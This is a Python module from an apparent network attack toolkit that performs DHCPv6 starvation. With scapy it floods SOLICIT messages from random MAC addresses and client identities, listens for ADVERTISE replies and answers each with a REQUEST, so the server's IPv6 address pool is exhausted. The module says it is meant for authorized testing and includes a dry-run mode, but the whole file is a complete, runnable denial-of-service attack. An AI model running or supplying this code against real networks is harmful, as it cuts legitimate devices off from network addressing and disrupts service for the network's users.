"""DHCPv6 starvation: exhausts an IPv6 server's address pool with random client identities.

For each SOLICIT sent with a random DUID and IA_NA, the attacker listens for the
ADVERTISE and completes the exchange with a REQUEST. The server records a binding for
that identity, so its pool is consumed.

The SOLICIT goes to the All_DHCP_Relay_Agents_and_Servers multicast group from the
link-local address derived from this interface's random MAC.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, IPv6, UDP, AsyncSniffer, sendp
from scapy.layers.dhcp6 import (
    DHCP6_Advertise,
    DHCP6_Request,
    DHCP6_Solicit,
    DHCP6OptClientId,
    DHCP6OptIA_NA,
    DHCP6OptIAAddress,
    DHCP6OptServerId,
    DUID_LLT,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac

CLIENT_PORT = 546
SERVER_PORT = 547
ALL_DHCP_SERVERS_IP = "ff02::1:2"
ALL_DHCP_SERVERS_MAC = "33:33:00:01:00:02"
MAX_PENDING = 10_000


@dataclass(frozen=True)
class Dhcpv6StarvationConfig:
    iface: str
    count: int = 0            # SOLICIT messages to send; 0 = run until stopped
    interval: float = 0.05    # seconds between SOLICIT messages
    request: bool = True      # answer each ADVERTISE with a REQUEST (creates the binding)
    dry_run: bool = False     # build messages but do not send them

    def __post_init__(self) -> None:
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class Dhcpv6StarvationStats:
    solicits: int = 0
    advertises: int = 0
    requests: int = 0
    status: str = ""


def link_local_from_mac(mac: str) -> str:
    """Link-local address from a MAC address (EUI-64: insert ff:fe, flip the local bit)."""
    octets = [int(o, 16) for o in normalize_unicast_mac(mac).split(":")]
    octets[0] ^= 0x02
    eui = octets[:3] + [0xFF, 0xFE] + octets[3:]
    groups = [f"{eui[i]:02x}{eui[i + 1]:02x}" for i in range(0, 8, 2)]
    return "fe80::" + ":".join(groups)


def build_solicit(mac: str, trid: int, iaid: int) -> Packet:
    """SOLICIT from a client with DUID-LL/LLT of `mac`, asking for one IA_NA address."""
    mac = normalize_unicast_mac(mac)
    return (
        Ether(src=mac, dst=ALL_DHCP_SERVERS_MAC)
        / IPv6(src=link_local_from_mac(mac), dst=ALL_DHCP_SERVERS_IP)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / DHCP6_Solicit(trid=trid)
        / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
        / DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0)
    )


def build_request(mac: str, trid: int, iaid: int, server_mac: str, offered: str) -> Packet:
    """REQUEST for the address an ADVERTISE offered, addressed to the advertising server."""
    mac = normalize_unicast_mac(mac)
    server = normalize_unicast_mac(server_mac)
    return (
        Ether(src=mac, dst=ALL_DHCP_SERVERS_MAC)
        / IPv6(src=link_local_from_mac(mac), dst=ALL_DHCP_SERVERS_IP)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / DHCP6_Request(trid=trid)
        / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
        / DHCP6OptServerId(duid=DUID_LLT(lladdr=server, timeval=0))
        / DHCP6OptIA_NA(iaid=iaid, T1=0, T2=0, ianaopts=[DHCP6OptIAAddress(addr=offered)])
    )


@dataclass(frozen=True)
class Advertise:
    trid: int
    client_mac: str
    server_mac: str
    offered: str
    iaid: int


def parse_advertise(packet: Packet) -> Advertise | None:
    """Fields of an ADVERTISE that offers an IA_NA address, or None."""
    if not (packet.haslayer(DHCP6_Advertise) and packet.haslayer(DHCP6OptIA_NA)):
        return None
    ia = packet[DHCP6OptIA_NA]
    if not ia.ianaopts or not packet.haslayer(DHCP6OptServerId) or not packet.haslayer(DHCP6OptClientId):
        return None
    return Advertise(
        trid=packet[DHCP6_Advertise].trid,
        client_mac=packet[DHCP6OptClientId].duid.lladdr,
        server_mac=packet[DHCP6OptServerId].duid.lladdr,
        offered=ia.ianaopts[0].addr,
        iaid=ia.iaid,
    )


def run_dhcpv6_starvation(
    config: Dhcpv6StarvationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[Dhcpv6StarvationStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> Dhcpv6StarvationStats:
    """Send SOLICIT messages with random identities, and answer advertises, until stopped."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = Dhcpv6StarvationStats(
            status=(
                f"Dry run: would send {config.count or 'unlimited'} DHCPv6 SOLICIT messages with random "
                f"client identities on {config.iface}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = Dhcpv6StarvationStats()
    pending: dict[tuple[str, int], int] = {}     # (client MAC, trid) -> iaid, waiting for an ADVERTISE
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        advertise = parse_advertise(packet)
        if advertise is None:
            return
        key = (advertise.client_mac, advertise.trid)
        with lock:
            if key not in pending:
                return
            stats.advertises += 1
            pending.pop(key)
            stats.requests += 1 if config.request else 0
            snapshot = replace(stats)
        if config.request:
            send(build_request(advertise.client_mac, advertise.trid, advertise.iaid,
                               advertise.server_mac, advertise.offered),
                 iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        while not stop_event.is_set() and (config.count == 0 or stats.solicits < config.count):
            mac = random_mac(rng)
            trid = rng.getrandbits(24)
            iaid = rng.getrandbits(32)
            with lock:
                if len(pending) < MAX_PENDING:
                    pending[(mac, trid)] = iaid
                stats.solicits += 1
                snapshot = replace(stats)
            send(build_solicit(mac, trid, iaid), iface=config.iface, verbose=False)
            on_progress(snapshot)
            stop_event.wait(config.interval)
    finally:
        sniffer.stop()
    return stats
